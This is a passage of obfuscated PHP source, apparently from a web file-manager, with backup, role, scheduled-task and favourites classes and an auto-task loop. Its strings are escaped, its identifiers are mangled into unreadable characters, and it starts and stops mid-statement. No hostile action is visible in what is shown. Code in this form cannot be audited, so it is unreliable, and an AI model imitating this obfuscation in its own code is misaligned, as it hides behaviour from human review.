"\x7b\x69\157\x3a{$èÑ–Ãğ³[$ƒºÂöš[755]]}\175\57\144\x61\x74\x61\x62\141\163\145\57\142\141\143\153\x75\x70\57" . $Š®¾ûÛ . $ƒºÂöš[11] . $Ü¸•ØÃ›; } public function db() { $Ï¹»Ü›Œ =& $_SERVER[„Ç©ñÎ©]; $ûÇ¹º° = self::get(); if ($ûÇ¹º°[$Ï¹»Ü›Œ[302]][$Ï¹»Ü›Œ[761]][$Ï¹»Ü›Œ[753]] == $Ï¹»Ü›Œ[98]) { return !0; } $¤„ÎÂç˜ = new BackupDb(); if (!$¤„ÎÂç˜->index()) { return !1; } self::set(array($Ï¹»Ü›Œ[776] => 1)); return !0; } public function dbFile() { $ïèê”òì =& $_SERVER[„Ç©ñÎ©]; $æ‚šÊºÀ = self::get(); if ($æ‚šÊºÀ[$ïèê”òì[302]][$ïèê”òì[765]][$ïèê”òì[753]] == $ïèê”òì[98]) { return !0; } $’Óú´¯† = new BackupDbFile(); if (!$’Óú´¯†->index()) { return !1; } self::set(array($ïèê”òì[777] => 1)); return !0; } public function file() { $¨Şóø¾ƒ =& $_SERVER[„Ç©ñÎ©]; $âÑäÏŠá = self::get(); if ($âÑäÏŠá[$¨Şóø¾ƒ[302]][$¨Şóø¾ƒ[209]][$¨Şóø¾ƒ[753]] == $¨Şóø¾ƒ[98]) { return !0; } if (!isset($âÑäÏŠá[$¨Şóø¾ƒ[758]]) || $âÑäÏŠá[$¨Şóø¾ƒ[758]] == $¨Şóø¾ƒ[207]) { $€¾î°ÅØ = new BackupFile(); if (!$€¾î°ÅØ->index()) { return !1; } } self::set(array($¨Şóø¾ƒ[778] => 1, $¨Şóø¾ƒ[753] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $øŒÖ·¦ =& $_SERVER[„Ç©ñÎ©]; $•éË­Šè = Backup::get(); self::$io = $•éË­Šè[$øŒÖ·¦[755]]; self::$name = $•éË­Šè[$øŒÖ·¦[32]]; $ÅæØÒ…¬ = new DbManage(); $ÙŞ‚ëŸÎ = $ÅæØÒ…¬->dbType(); $‹Öµ”òÚ = array($øŒÖ·¦[779] => $ÙŞ‚ëŸÎ, $øŒÖ·¦[780] => time()); Backup::set($‹Öµ”òÚ); $Ç„€À  = $this->tmpFilesPath() . $øŒÖ·¦[781] . self::$name . $øŒÖ·¦[8]; del_dir($Ç„€À ); mk_dir($Ç„€À ); $öáğÛ¿ƒ = $ÉÖÜëò§ = 0; $”ùÃ®” = new Task($øŒÖ·¦[782], $øŒÖ·¦[783], 0, LNG($øŒÖ·¦[784]) . $øŒÖ·¦[785] . LNG($øŒÖ·¦[786])); try { $Ô–ÈÌÀ… = $ÅæØÒ…¬->db()->getTables(); } catch (Exception $›§Ùà½‚) { $”ùÃ®”->end(); return !1; } $Ô–ÈÌÀ… = array_diff($Ô–ÈÌÀ…, array($øŒÖ·¦[787], $øŒÖ·¦[788])); foreach ($Ô–ÈÌÀ… as $Ü„ùæ“³) { $öáğÛ¿ƒ += $ÅæØÒ…¬->model($Ü„ùæ“³)->count(); } $”ùÃ®”->task[$øŒÖ·¦[789]] = $öáğÛ¿ƒ; $GLOBALS[$øŒÖ·¦[790]] = self::$name; foreach ($Ô–ÈÌÀ… as $Ü„ùæ“³) { $ºÉì»Şı = $Ç„€À  . $Ü„ùæ“³ . $øŒÖ·¦[791]; $œ­»‹Éı = null; if ($Ü„ùæ“³ == $øŒÖ·¦[792] && (!isset($•éË­Šè[$øŒÖ·¦[758]]) || $•éË­Šè[$øŒÖ·¦[758]] == $øŒÖ·¦[207])) { $œ­»‹Éı = self::$io; } $ÉÖÜëò§ += $ÅæØÒ…¬->sqlFromDb($Ü„ùæ“³, $ºÉì»Şı, $”ùÃ®”, $œ­»‹Éı); } unset($GLOBALS[$øŒÖ·¦[790]]); $”ùÃ®”->end(); if ($ÉÖÜëò§ > $öáğÛ¿ƒ) { $öáğÛ¿ƒ = $ÉÖÜëò§; } $‹Öµ”òÚ = array($øŒÖ·¦[779] => $ÙŞ‚ëŸÎ, $øŒÖ·¦[776] => 1, $øŒÖ·¦[793] => $öáğÛ¿ƒ, $øŒÖ·¦[794] => $ÉÖÜëò§, $øŒÖ·¦[795] => time()); Backup::set($‹Öµ”òÚ); if ($öáğÛ¿ƒ - $ÉÖÜëò§ > 0) { $Ìâ§ÌØó = $øŒÖ·¦[796]; if (stristr(I18n::getType(), $øŒÖ·¦[797])) { $Ìâ§ÌØó = $øŒÖ·¦[798]; } write_log(array($Ìâ§ÌØó, $‹Öµ”òÚ), $øŒÖ·¦[783]); return !1; } return !0; } private function tmpFilesPath() { $Å§—÷²Ó =& $_SERVER[„Ç©ñÎ©]; $ÎòÛÊê = TEMP_FILES; if ($GLOBALS[$Å§—÷²Ó[6]][$Å§—÷²Ó[99]][$Å§—÷²Ó[799]]) { $ÎòÛÊê = $GLOBALS[$Å§—÷²Ó[6]][$Å§—÷²Ó[99]][$Å§—÷²Ó[799]]; if (!mk_dir($ÎòÛÊê) || !is_writable($ÎòÛÊê) || !IO::mkfile($ÎòÛÊê . $Å§—÷²Ó[800])) { $ÎòÛÊê = TEMP_FILES; } } return $ÎòÛÊê; } } goto aÍ¤ãÒ; b§Ä ÌÉÎÜ: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\x2e\x72\157\x6c\x65\114\x69\163\164"; public $field = array("\156\x61\x6d\x65", "\141\165\x74\x68", "\154\x61\x62\x65\x6c", "\x64\x69\x73\x70\154\x61\x79", "\x73\x79\163\164\145\155", "\x64\145\163\x63", "\151\x67\x6e\157\x72\x65\105\x78\164", "\151\x67\x6e\157\162\x65\x46\151\x6c\x65\123\x69\172\145", "\x61\x64\x6d\151\156\151\163\x74\x72\141\x74\157\162", "\x73\x6f\162\164"); public function listData($´ªâÕ—… = false, $ÂÓõÃÁÜ = "\163\x6f\x72\164", $Å§à‚—Ô = false) { $ˆ²µ¹¡ =& $_SERVER[„Ç©ñÎ©]; $ˆ²Š±Ôö = parent::listData($´ªâÕ—…, $ÂÓõÃÁÜ, $Å§à‚—Ô); if (!$´ªâÕ—…) { foreach ($ˆ²Š±Ôö as $ş¤’ùª° => $Üùß‡Ç ) { if ($Üùß‡Ç [$ˆ²µ¹¡[2025]] == 1) { $ˆ²Š±Ôö[$ş¤’ùª°][$ˆ²µ¹¡[462]] = LNG($ˆ²µ¹¡[2259]); } } } return $ˆ²Š±Ôö; } public function update($‹¥æú”Ê, $¥•¥Ä†) { $ÄÓâÒö› =& $_SERVER[„Ç©ñÎ©]; $³ŸØÍò = parent::listData($‹¥æú”Ê); $¤ÖœÊ¬ş = $this->findByName($¥•¥Ä†[$ÄÓâÒö›[32]]); if (!$³ŸØÍò || $¤ÖœÊ¬ş && $¤ÖœÊ¬ş[$ÄÓâÒö›[408]] != $³ŸØÍò[$ÄÓâÒö›[408]]) { return !1; } if ($¤ÖœÊ¬ş[$ÄÓâÒö›[2025]] == 1) { $¥•¥Ä† = array($ÄÓâÒö›[32] => $¥•¥Ä†[$ÄÓâÒö›[32]], $ÄÓâÒö›[1850] => $¥•¥Ä†[$ÄÓâÒö›[1850]]); } $this->filterAuth($¥•¥Ä†[$ÄÓâÒö›[422]]); return parent::update($‹¥æú”Ê, $¥•¥Ä†); } public function remove($á‹ƒç¢ñ) { $„áĞğÁ™ = parent::listData($á‹ƒç¢ñ); if (!$„áĞğÁ™ || $„áĞğÁ™[$_SERVER[„Ç©ñÎ©][1275]]) { return !1; } return parent::remove($á‹ƒç¢ñ); } public function add($·ŸÑò¹¹) { $Öà¨çÒ© =& $_SERVER[„Ç©ñÎ©]; $Ù´¬“ğ® = $·ŸÑò¹¹[$Öà¨çÒ©[32]]; if ($this->findByName($Ù´¬“ğ®)) { return !1; } $ç´Ûöú® = array($Öà¨çÒ©[429] => $Ù´¬“ğ®, $Öà¨çÒ©[1833] => $Öà¨çÒ©[12], $Öà¨çÒ©[1829] => $Öà¨çÒ©[1837], $Öà¨çÒ©[2260] => 1, $Öà¨çÒ©[1832] => 0, $Öà¨çÒ©[2261] => 0, $Öà¨çÒ©[1831] => $this->getSort()); $·ŸÑò¹¹ = array_merge($ç´Ûöú®, $·ŸÑò¹¹); $this->filterAuth($·ŸÑò¹¹[$Öà¨çÒ©[422]]); return parent::insert($·ŸÑò¹¹); } private function getSort() { $É´¬‚ö˜ =& $_SERVER[„Ç©ñÎ©]; $ş¥„¥€± = parent::listData(); $â’Ôá³ = array_to_keyvalue($ş¥„¥€±, $É´¬‚ö˜[12], $É´¬‚ö˜[1851]); return empty($â’Ôá³) ? 0 : max($â’Ôá³) + 1; } private function filterAuth(&$ææ¸ñŠÅ) { $î¤ÊÁÄØ =& $_SERVER[„Ç©ñÎ©]; $æ£íò = array(); $á›´ŠÚÖ = array_filter(explode($î¤ÊÁÄØ[50], $ææ¸ñŠÅ)); foreach ($á›´ŠÚÖ as $ææ¸ñŠÅ) { $ôø×œõó = explode($î¤ÊÁÄØ[10], $ææ¸ñŠÅ); if ($ôø×œõó[0] == $î¤ÊÁÄØ[2262] && $ôø×œõó[1] != $î¤ÊÁÄØ[1194]) { $–ìó•Ç = $ôø×œõó[0] . $î¤ÊÁÄØ[10] . $ôø×œõó[1] . $î¤ÊÁÄØ[2263]; if (!in_array($–ìó•Ç, $á›´ŠÚÖ)) { $æ£íò[] = $–ìó•Ç; } } $æ£íò[] = $ææ¸ñŠÅ; } $ææ¸ñŠÅ = implode($î¤ÊÁÄØ[50], $æ£íò); } public function findRoleDefault() { $Ôµ„áÖŒ =& $_SERVER[„Ç©ñÎ©]; $Ö¦ÙãÜ = parent::listData(); $€ÉĞ‰§§ = !1; foreach ($Ö¦ÙãÜ as $—Ä¥Ùœå) { if (!$—Ä¥Ùœå || $—Ä¥Ùœå[$Ôµ„áÖŒ[1849]] == $Ôµ„áÖŒ[207] || $—Ä¥Ùœå[$Ôµ„áÖŒ[2025]] == 1) { continue; } if (strstr($—Ä¥Ùœå[$Ôµ„áÖŒ[422]], $Ôµ„áÖŒ[2264])) { continue; } if (!strstr($—Ä¥Ùœå[$Ôµ„áÖŒ[422]], $Ôµ„áÖŒ[2265])) { continue; } if (!$€ÉĞ‰§§) { $€ÉĞ‰§§ = $—Ä¥Ùœå; continue; } $ü°À²ğ = explode($Ôµ„áÖŒ[50], $€ÉĞ‰§§[$Ôµ„áÖŒ[422]]); $Äõ´¯Ì€ = explode($Ôµ„áÖŒ[50], $—Ä¥Ùœå[$Ôµ„áÖŒ[422]]); if (count($ü°À²ğ) > count($Äõ´¯Ì€)) { $€ÉĞ‰§§ = $—Ä¥Ùœå; } } return $€ÉĞ‰§§ ? $€ÉĞ‰§§[$Ôµ„áÖŒ[408]] : $Ôµ„áÖŒ[12]; } public function sort($ªªÙÎÉù, $ß¢ûú‘) { return parent::update($ªªÙÎÉù, $ß¢ûú‘); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\x2e\164\x61\163\x6b\114\151\163\164"; public $field = array("\x6e\141\155\x65", "\164\x79\x70\x65", "\145\x76\x65\x6e\164", "\x74\151\155\145", "\x64\145\163\x63", "\163\171\x73\x74\145\155", "\x65\156\x61\142\x6c\x65", "\154\x61\163\x74\x52\x75\x6e", "\x73\157\x72\164"); public function listData($Ç‚ÙØ Å = false, $ğ ıåº¹ = "\x73\x6f\x72\164", $ÌÉù‚Î© = false) { return parent::listData($Ç‚ÙØ Å, $ğ ıåº¹, $ÌÉù‚Î©); } public function add($™°±Ïë) { $üŸ¨Ê¡„ =& $_SERVER[„Ç©ñÎ©]; $¡ŠôË÷¸ = $this->findByName($™°±Ïë[$üŸ¨Ê¡„[32]]); if ($¡ŠôË÷¸) { return !1; } $™°±Ïë[$üŸ¨Ê¡„[1615]] = 0; $™°±Ïë[$üŸ¨Ê¡„[1851]] = $this->getSort(); return parent::insert($™°±Ïë); } private function getSort() { $„şÑ—‰ğ =& $_SERVER[„Ç©ñÎ©]; $ãÁÍØ´ = parent::listData(); $²õŸôæ  = array_to_keyvalue($ãÁÍØ´, $„şÑ—‰ğ[12], $„şÑ—‰ğ[1851]); return empty($²õŸôæ ) ? 0 : max($²õŸôæ ) + 1; } public function update($ƒ–²ÆšÅ, $×ˆ³ŞÀÇ) { $¥üÕØŸ¢ =& $_SERVER[„Ç©ñÎ©]; $¥àı““û = $this->listData($ƒ–²ÆšÅ); $ªçÊŸ­ = $this->findByName($×ˆ³ŞÀÇ[$¥üÕØŸ¢[32]]); if (!$¥àı““û || $ªçÊŸ­ && $ªçÊŸ­[$¥üÕØŸ¢[408]] != $¥àı““û[$¥üÕØŸ¢[408]]) { return !1; } return parent::update($ƒ–²ÆšÅ, $×ˆ³ŞÀÇ); } public function remove($ƒıÎ½¤, $Áì¢½Ú = false) { $—ôË‡Äï =& $_SERVER[„Ç©ñÎ©]; $ÖÁÁÔÕ¯ = $this->listData($ƒıÎ½¤); if (!$ÖÁÁÔÕ¯) { return; } if (!$Áì¢½Ú && $ÖÁÁÔÕ¯[$—ôË‡Äï[1275]] == $—ôË‡Äï[98]) { return !1; } return parent::remove($ƒıÎ½¤); } public function enable($ğäÂ•éÒ, $Şìğ†¡¢) { return $this->update($ğäÂ•éÒ, array($_SERVER[„Ç©ñÎ©][2254] => $Şìğ†¡¢)); } public function run($—„ø¥…ç) { return $this->update($—„ø¥…ç, array($_SERVER[„Ç©ñÎ©][2266] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\145\x72\137\146\x61\x76"; protected function cacheFunctionAlias($ÄÏÜ†Èæ) { $ÌÊŒé³Ì =& $_SERVER[„Ç©ñÎ©]; return array($ÌÊŒé³Ì[1938] => array(USER_ID, $ÌÊŒé³Ì[2267])); } protected function listData() { $”é°î–– =& $_SERVER[„Ç©ñÎ©]; $àÃ£áæ§ = array($”é°î––[1646] => USER_ID, $”é°î––[493] => 0); $×şø·çİ = $”é°î––[2268]; $»ıÇ‚ÌÌ = $this->field($×şø·çİ)->where($àÃ£áæ§)->order($”é°î––[2269])->select(); return $»ıÇ‚ÌÌ ? $»ıÇ‚ÌÌ : array(); } protected function resetCache() { } protected function listView() { $Ì¶…¶ëÊ =& $_SERVER[„Ç©ñÎ©]; $É‹Ğğ½ = $this->listData(); $‡‰³¨ = array_filter_by_field($É‹Ğğ½, $Ì¶…¶ëÊ[33], $Ì¶…¶ëÊ[425]); $…ˆ¡èœ÷ = array_to_keyvalue($‡‰³¨, $Ì¶…¶ëÊ[12], $Ì¶…¶ëÊ[94]); if (!$…ˆ¡èœ÷) { return $É‹Ğğ½; } $ã í£ÕÜ = 2000; $¦Êúú«Ş = array($Ì¶…¶ëÊ[426] => array($Ì¶…¶ëÊ[427], $…ˆ¡èœ÷)); $•£Ğ¿ = Model($Ì¶…¶ëÊ[828])->listSource($¦Êúú«Ş, $ã í£ÕÜ); $•£Ğ¿ = array_merge($•£Ğ¿[$Ì¶…¶ëÊ[93]], $•£Ğ¿[$Ì¶…¶ëÊ[92]]); $•£Ğ¿ = array_to_keyvalue($•£Ğ¿, $Ì¶…¶ëÊ[411]); foreach ($É‹Ğğ½ as $¡å•Ê¶ => $¼Ì•²ó‚) { $“çÓåë = $•£Ğ¿[$¼Ì•²ó‚[$Ì¶…¶ëÊ[94]]]; $“çÓåë = $“çÓåë ? $“çÓåë : array(); $É‹Ğğ½[$¡å•Ê¶] = array_merge($“çÓåë, $¼Ì•²ó‚); } return $É‹Ğğ½; } protected function addFav($Ò®çú´, $¼º“ñá™ = '', $ü·å£¯ñ = "\163\157\x75\162\143\x65") { $éË›†¥  =& $_SERVER[„Ç©ñÎ©]; $ŒŞÜ• = array($éË›†¥ [1646] => USER_ID, $éË›†¥ [493] => 0, $éË›†¥ [431] => $ü·å£¯ñ, $éË›†¥ [430] => $Ò®çú´); if ($this->where($ŒŞÜ•)->find()) { return !1; } $ŒŞÜ• = array($éË›†¥ [1646] => USER_ID, $éË›†¥ [493] => 0); $Í“ŒÚ¦÷ = $this->where($ŒŞÜ•)->max($éË›†¥ [1851]); if (!$Í“ŒÚ¦÷) { $Í“ŒÚ¦÷ = 0; } if (!$¼º“ñá™ && $ü·å£¯ñ == $éË›†¥ [425]) { $¿Éú ½„ = Model($éË›†¥ [1326])->where(array($éË›†¥ [426] => $Ò®çú´))->find(); if (!$¿Éú ½„) { return !1; } $¼º“ñá™ = $¿Éú ½„[$éË›†¥ [32]]; } $¼º“ñá™ = $this->getAutoName($¼º“ñá™); $©½Ø‘Å¬ = array($éË›†¥ [1646] => USER_ID, $éË›†¥ [493] => 0, $éË›†¥ [429] => $¼º“ñá™, $éË›†¥ [430] => $Ò®çú´, $éË›†¥ [431] => $ü·å£¯ñ, $éË›†¥ [1831] => $Í“ŒÚ¦÷ + 1); return $this->add($©½Ø‘Å¬); } protected function remove($şâØ†»’) { $¦óÆĞ’€ =& $_SERVER[„Ç©ñÎ©]; $ŸÂçßóò = array($¦óÆĞ’€[1646] => USER_ID, $¦óÆĞ’€[428] => $şâØ†»’); return $this->where($ŸÂçßóò)->delete(); } protected function removeByName($éã‹Ó½) { $Õ¯ÆŸ®è =& $_SERVER[„Ç©ñÎ©]; $ô·óÌÉş = array($Õ¯ÆŸ®è[1646] => USER_ID, $Õ¯ÆŸ®è[429] => $éã‹Ó½, $Õ¯ÆŸ®è[493] => 0); return $this->where($ô·óÌÉş)->delete(); } protected function rename($Ü…£œ»µ, $Å»ÆÙÍÊ) { $äªÏŒÛØ =& $_SERVER[„Ç©ñÎ©]; if ($Ü…£œ»µ == $Å»ÆÙÍÊ) { return !1; } $¿Éçß½’ = $this->getAutoName($Å»ÆÙÍÊ); if ($Å»ÆÙÍÊ != $¿Éçß½’) { return !1; } $Ôå¨ßûÅ = array($äªÏŒÛØ[1646] => USER_ID, $äªÏŒÛØ[493] => 0, $äªÏŒÛØ[32] => $Ü…£œ»µ); return $this->where($Ôå¨ßûÅ)->save(array($äªÏŒÛØ[32] => $Å»ÆÙÍÊ)); } protected function resetSort($çÍô¸àä) { $˜ë‚î“œ =& $_SERVER[„Ç©ñÎ©]; $çÍô¸àä = is_array($çÍô¸àä) ? $çÍô¸àä : array(); $Éùìİ¿… = array($˜ë‚î“œ[1646] => USER_ID); for ($‰´©Î¿Ù = 0; $‰´©Î¿Ù < count($çÍô¸àä); $‰´©Î¿Ù++) { $Éùìİ¿…[$˜ë‚î“œ[428]] = $çÍô¸àä[$‰´©Î¿Ù]; $this->where($Éùìİ¿…)->save(array($˜ë‚î“œ[1831] => $‰´©Î¿Ù + 1)); } return !0; } protected function moveTop($Ò¥¤ØÅ¨) { $¤ÒõÑÓ— =& $_SERVER[„Ç©ñÎ©]; $Ûìé©âÃ = array($¤ÒõÑÓ—[1646] => USER_ID, $¤ÒõÑÓ—[493] => 0); $Ã¸¿°¢Í = $this->where($Ûìé©âÃ)->where(array($¤ÒõÑÓ—[32] => $Ò¥¤ØÅ¨))->find(); if (!$Ã¸¿°¢Í) { return; } $Ë×ÆéŠ = $this->field($¤ÒõÑÓ—[408])->where($Ûìé©âÃ)->order($¤ÒõÑÓ—[2269])->select(); $Ë×ÆéŠ = array_to_keyvalue($Ë×ÆéŠ, $¤ÒõÑÓ—[12], $¤ÒõÑÓ—[408]); $ã²Ö¼ = $Ë×ÆéŠ; $Ë×ÆéŠ = array_remove_value($Ë×ÆéŠ, $Ã¸¿°¢Í[$¤ÒõÑÓ—[408]]); array_unshift($Ë×ÆéŠ, $Ã¸¿°¢Í[$¤ÒõÑÓ—[408]]); return $this->resetSort($Ë×ÆéŠ); } protected function moveBottom($Ÿ‘§È‰Ó) { $—Ì¾Îˆâ =& $_SERVER[„Ç©ñÎ©]; $ÓğÁÖöƒ = array($—Ì¾Îˆâ[1646] => USER_ID, $—Ì¾Îˆâ[493] => 0); $ÔÕìé¿ = $this->where($ÓğÁÖöƒ)->max($—Ì¾Îˆâ[1851]); $®¡¢ãü = array($—Ì¾Îˆâ[1851] => $ÔÕìé¿ + 1); return $this->where($ÓğÁÖöƒ)->where(array($—Ì¾Îˆâ[32] => $Ÿ‘§È‰Ó))->save($®¡¢ãü); } private function getAutoName($®®±ğ‰ä) { $ÊªÎ¼Î =& $_SERVER[„Ç©ñÎ©]; $º®Ş‡ê¼ = array($ÊªÎ¼Î[1646] => USER_ID, $ÊªÎ¼Î[493] => 0); $äÙÔ“¾… = $this->field($ÊªÎ¼Î[32])->where($º®Ş‡ê¼)->select(); $äÙÔ“¾… = array_to_keyvalue($äÙÔ“¾…, $ÊªÎ¼Î[12], $ÊªÎ¼Î[32]); if (!$äÙÔ“¾… || !in_array($®®±ğ‰ä, $äÙÔ“¾…)) { return $®®±ğ‰ä; } for ($ùìÏ×ÊÂ = 0; $ùìÏ×ÊÂ < count($äÙÔ“¾…); $ùìÏ×ÊÂ++) { if (!in_array($®®±ğ‰ä . "\50{$ùìÏ×ÊÂ}\x29", $äÙÔ“¾…)) { return $®®±ğ‰ä . "\50{$ùìÏ×ÊÂ}\51"; } } return $®®±ğ‰ä . "\x28{$ùìÏ×ÊÂ}\51"; } } goto DÎöèßâƒÉ; D¹íÏ‚œ‘: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $í·¢¾ =& $_SERVER[„Ç©ñÎ©]; if (self::valueGet($í·¢¾[753]) != $í·¢¾[98]) { return; } if (self::valueGet($í·¢¾[1614]) == $í·¢¾[98]) { $Ğ¢š÷Ñë = self::valueGet($í·¢¾[1615]); if (time() - $Ğ¢š÷Ñë > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$í·¢¾[1616]] = 1; self::valueSet($í·¢¾[1614], $í·¢¾[98]); self::log($í·¢¾[1617] . ACTION . $í·¢¾[1618]); Session::$data = array(); Session::$sessionSign = $í·¢¾[12]; $GLOBALS[$í·¢¾[512]] = 1; Hook::bind($í·¢¾[1619], $í·¢¾[1620]); $¤¸§§‘Ù = 0; while (!0) { self::cacheClear(); if (self::valueGet($í·¢¾[753]) != $í·¢¾[98]) { self::valueSet($í·¢¾[1614], $í·¢¾[207]); self::log($í·¢¾[1621]); die; } $Ã¨ùù¡Ö = time(); if ($Ã¨ùù¡Ö - $¤¸§§‘Ù >= 60) { self::valueSet(array($í·¢¾[1614] => $í·¢¾[98], $í·¢¾[1615] => $Ã¨ùù¡Ö), !1); $¤¸§§‘Ù = $Ã¨ùù¡Ö; } if (!file_exists(USER_SYSTEM . $í·¢¾[1622])) { self::valueSet(array($í·¢¾[1614] => $í·¢¾[207], $í·¢¾[753] => $í·¢¾[207]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $şÍ­¬Ğ± =& $_SERVER[„Ç©ñÎ©]; http_close(); self::valueSet($şÍ­¬Ğ±[753], $şÍ­¬Ğ±[207]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($şÍ­¬Ğ±[1614] => $şÍ­¬Ğ±[207], $şÍ­¬Ğ±[753] => $şÍ­¬Ğ±[98]), !1); } public static function taskSwitch() { $ÛÊÔÒËĞ =& $_SERVER[„Ç©ñÎ©]; $°Á¶— = self::valueGet($ÛÊÔÒËĞ[753]) == $ÛÊÔÒËĞ[98] ? $ÛÊÔÒËĞ[207] : $ÛÊÔÒËĞ[98]; self::valueSet($ÛÊÔÒËĞ[753], $°Á¶—); } public static function shutdownEvent() { $²¿¢ßò =& $_SERVER[„Ç©ñÎ©]; self::valueSet($²¿¢ßò[1614], $²¿¢ßò[207]); self::log($²¿¢ßò[1623]); } public static function config($¾ñæÔó, $ÀÛéòÚÅ) { self::valueSet($_SERVER[„Ç©ñÎ©][753], $¾ñæÔó); } private static function taskRunAll() { $¸ÓïğÉµ =& $_SERVER[„Ç©ñÎ©]; $ş‹¦à = timeFloat(); $şÎÎâÀ§ = Model($¸ÓïğÉµ[1624])->listData(); $¬Êøä‰ = count($şÎÎâÀ§); for ($ÉÛòØ¬² = 0; $ÉÛòØ¬² < $¬Êøä‰; $ÉÛòØ¬²++) { $†ŠªãÜ¼ = $şÎÎâÀ§[$ÉÛòØ¬²]; if (!$†ŠªãÜ¼[$¸ÓïğÉµ[408]] || $†ŠªãÜ¼[$¸ÓïğÉµ[1625]] != $¸ÓïğÉµ[98]) { continue; } if (!self::taskTimeCheck($†ŠªãÜ¼)) { continue; } self::taskRun($†ŠªãÜ¼); } Hook::trigger($¸ÓïğÉµ[1626]); self::taskQueueRun($ş‹¦à); } private static function taskQueueRun($¥ÊÒİğ‡) { $ş×Ø÷òÛ = 10; while (!0) { $È‹‚¹Ÿ€ = TaskQueue::run(); if ($È‹‚¹Ÿ€ === !1) { break; } if (timeFloat() - $¥ÊÒİğ‡ >= $ş×Ø÷òÛ) { break; } } } private static function taskTimeCheck($»²£‰) { $ÄøÀ¤ =& $_SERVER[„Ç©ñÎ©]; $Šú–œæ… = json_decode($»²£‰[$ÄøÀ¤[213]], !0); $–¾š«„› = intval($»²£‰[$ÄøÀ¤[1615]]); $­ƒ‹îãÄ = strtotime($ÄøÀ¤[1627] . $Šú–œæ…[$ÄøÀ¤[1628]] . $ÄøÀ¤[1629]) - strtotime($ÄøÀ¤[1630]); $ŠÌŞáÛı = time() - strtotime(date($ÄøÀ¤[1631]) . $ÄøÀ¤[1632]); $¸ö­Ü€ = $ŠÌŞáÛı >= $­ƒ‹îãÄ && $ŠÌŞáÛı <= $­ƒ‹îãÄ + 3600; switch ($Šú–œæ…[$ÄøÀ¤[33]]) { case $ÄøÀ¤[1633]: if (time() - $–¾š«„› < 3600 * 24 * 30) { return !1; } if ($Šú–œæ…[$ÄøÀ¤[1633]] == date($ÄøÀ¤[1634]) && $¸ö­Ü€) { return !0; } break; case $ÄøÀ¤[1635]: if (time() - $–¾š«„› < 3600 * 24 * 7) { return !1; } $Ó”µÀŒÆ = date($ÄøÀ¤[1636]) == 0 ? 7 : date($ÄøÀ¤[1636]); if ($Šú–œæ…[$ÄøÀ¤[1635]] == $Ó”µÀŒÆ && $¸ö­Ü€) { return !0; } break; case $ÄøÀ¤[1628]: if (time() - $–¾š«„› < 3600 * 24) { return !1; } if ($¸ö­Ü€) { return !0; } break; case $ÄøÀ¤[1637]: if (time() - $–¾š«„› >= floatval($Šú–œæ…[$ÄøÀ¤[1637]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $³ÉáÑâ¯ =& $_SERVER[„Ç©ñÎ©]; static $½€Ù´õ– = 0; $•½Ô–µ• = 300; if (!$½€Ù´õ–) { $½€Ù´õ– = time(); } if (time() - $½€Ù´õ– < $•½Ô–µ•) { return; } $½€Ù´õ– = time(); $¶óôÃŸ = Model($³ÉáÑâ¯[522])->db($³ÉáÑâ¯[12]); if ($¶óôÃŸ) { $¶óôÃŸ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($³ÉáÑâ¯[1638], $³ÉáÑâ¯[1639]); die; } } public static function taskRun($¼ƒŠ²Ê) { $®üĞìí¨ =& $_SERVER[„Ç©ñÎ©]; self::log($®üĞìí¨[1640] . $¼ƒŠ²Ê[$®üĞìí¨[408]] . $®üĞìí¨[1641] . $¼ƒŠ²Ê[$®üĞìí¨[32]] . $®üĞìí¨[1642] . $¼ƒŠ²Ê[$®üĞìí¨[1643]]); Model($®üĞìí¨[1624])->run($¼ƒŠ²Ê[$®üĞìí¨[408]]); $üƒÖÜ’Ø = timeFloat(); $íÔÄ¦Ûˆ = $®üĞìí¨[12]; switch ($¼ƒŠ²Ê[$®üĞìí¨[33]]) { case $®üĞìí¨[316]: $£şÇïïê = url_request($¼ƒŠ²Ê[$®üĞìí¨[1643]], $®üĞìí¨[240], !1, !1, !1, !1, 10); if ($£şÇïïê[$®üĞìí¨[753]]) { $íÔÄ¦Ûˆ = strlen($£şÇïïê[$®üĞìí¨[1192]]); } break; case $®üĞìí¨[239]: $íÔÄ¦Ûˆ = Hook::apply($¼ƒŠ²Ê[$®üĞìí¨[1643]]); default: break; } Model($®üĞìí¨[1644])->add(array($®üĞìí¨[1645] => $®üĞìí¨[12], $®üĞìí¨[1646] => $®üĞìí¨[207], $®üĞìí¨[33] => $®üĞìí¨[1647] . $¼ƒŠ²Ê[$®üĞìí¨[408]], $®üĞìí¨[1648] => json_encode(array($®üĞìí¨[32] => $¼ƒŠ²Ê[$®üĞìí¨[32]], $®üĞìí¨[1649] => timeFloat() - $üƒÖÜ’Ø, $®üĞìí¨[302] => $íÔÄ¦Ûˆ)))); $¯­ÏŒ = $íÔÄ¦Ûˆ ? $®üĞìí¨[1650] . $íÔÄ¦Ûˆ : $®üĞìí¨[12]; self::log($®üĞìí¨[1651] . $¼ƒŠ²Ê[$®üĞìí¨[408]] . $®üĞìí¨[174] . $¯­ÏŒ); return !0; } private static function valueGet($®ª ¥²Ï) { $¢ßš´ü® =& $_SERVER[„Ç©ñÎ©]; $òÃ¢Éèê = $¢ßš´ü®[1652]; $î“•§˜¨ = Model($¢ßš´ü®[444])->get($®ª ¥²Ï, $òÃ¢Éèê); if (is_null($î“•§˜¨)) { Model($¢ßš´ü®[444])->set($¢ßš´ü®[753], $¢ßš´ü®[98], $òÃ¢Éèê); Model($¢ßš´ü®[444])->set($¢ßš´ü®[1614], $¢ßš´ü®[207], $òÃ¢Éèê); $î“•§˜¨ = Model($¢ßš´ü®[444])->get($®ª ¥²Ï, $òÃ¢Éèê); } return $î“•§˜¨; } private static function valueSet($°ò¼ÕÁ¹, $‰£ÒŞš) { $¿Ô‡¿Ï‚ =& $_SERVER[„Ç©ñÎ©]; $ÂÏ±–¦ = $¿Ô‡¿Ï‚[1653]; CacheLock::lock($ÂÏ±–¦); $¡ÊØ­± = 